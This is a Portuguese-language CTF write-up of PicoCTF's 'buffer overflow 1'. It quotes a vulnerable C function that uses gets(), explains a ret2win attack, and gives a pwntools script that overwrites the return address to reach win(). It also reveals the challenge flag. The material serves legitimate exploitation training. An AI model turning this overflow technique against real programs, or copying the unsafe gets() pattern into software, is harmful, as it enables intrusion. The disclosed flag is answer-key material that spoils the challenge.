# WriteUp: buffer overflow 1
## Descrição do Desafio:
**Author**: Sanjay C / Palash Oswal \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/258?category=6&page=2) \
**Categoria**: Binary Exploitation \
**Dificuldade**: Média \
**Data**: 2022 \
**Descrição**:
> Control the return address

## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
Assim como o anterior, este também fornece o arquivo fonte, `vuln.c`. Analisando o arquivo, podemos identificar uma vulnerabilidade de `buffer overflow` na função `vuln()`.
```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
Ainda olhando para o código, podemos ver que não há nenhuma função setada para caso ocorra segmentation fault, mas ainda há uma função que imprime a flag.
```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```
### 2. Exploit
Como a própria descrição do desafio diz, temos que controlar o endereço de retorno da função `vuln()`, fazer um famoso `Ret2Win`.

Resumidamente, quando uma função é chamada, é colocado o endereço de retorno dela no topo da pilha, e a pilha é uma região que pode ser facilmente sobrescrevida por `buffer overflow` (usando variáveis que estão na pilha, como é esse caso).
### 3. Solução
O primeiro passo para realizar um `Ret2Win` é identificar quantos bytes devem ser sobrescrevidos até chegar na região onde o endereço de retorno está armazenado, no meu caso apenas fui digitando e verificando pelo `GDB`, mas existem maneiras mais fáceis.

Com esse valor em mãos, basta escrever essa quantidade com lixo e em seguida escrever o endereço para onde você quer retornar, se atente a coisas como `little-endian` e arquitetura 32-bits ou 64-bits.

> [!important]
> Para encontrar o endereço da função `win()`, basta olhar em um decompilador ou debugger, pois a proteção `PIE` está desativada.
### 3.1 Solução com Python
```py
from pwn import *

elf = context.binary = ELF("./vuln")
p = remote(ip, porta) #Trocar pelos valores fornecidos.

payload = flat(
    "A" * 44,
    elf.sym["win"]
)

print(hex(elf.sym["win"]))

p.sendlineafter(b"string: ", payload)
p.recvline()

print(p.recvall().decode())
```
### Flag
`picoCTF{addr3ss3s_ar3_3asy_6462ca2d}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
